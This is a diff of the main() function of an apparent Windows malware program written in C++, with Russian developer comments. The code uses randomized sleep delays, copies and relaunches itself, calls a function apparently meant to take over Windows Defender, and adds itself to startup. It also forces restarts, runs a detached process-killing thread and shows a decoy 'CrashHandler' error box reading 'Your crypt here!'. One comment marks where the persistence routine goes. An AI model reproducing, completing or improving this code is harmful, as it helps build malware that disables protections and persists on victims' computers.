@@ -22,22 +22,22 @@ int main(int argc, char* argv[]) {
     }
     Sleep(rand() % 5000 + 5000);
     if (copyAndRunSelf()) {
-        deleteSelf();
         return 0;
     }
     if (!checkAndCreateFile("lafkildatnn.dat")) {
-        Sleep(rand() % 5000 + 5000);
         DefenderOwner(); // возможно както переработать ?
         addToStartup();
+        Sleep(1500);
+        reset();
+        Sleep(rand() % 5000 + 5000);
         restartSystem();
         return 0;
     }
     std::thread killerThread(StopAllShit); // Запускаем фоновый поток
     killerThread.detach();
-    stopExplorer();
     Sleep(rand() % 5000 + 5000);
     MessageBox(NULL, "Your crypt here!", "CrashHandler", MB_ICONERROR | MB_OK);;
-    // тут функция скачивания файла с локальной сети либо же по ссылке, ссылка в приоритете ( нужно выбрать
+    // тут основной процесс закрепления 
     getchar();
     
     return 0;
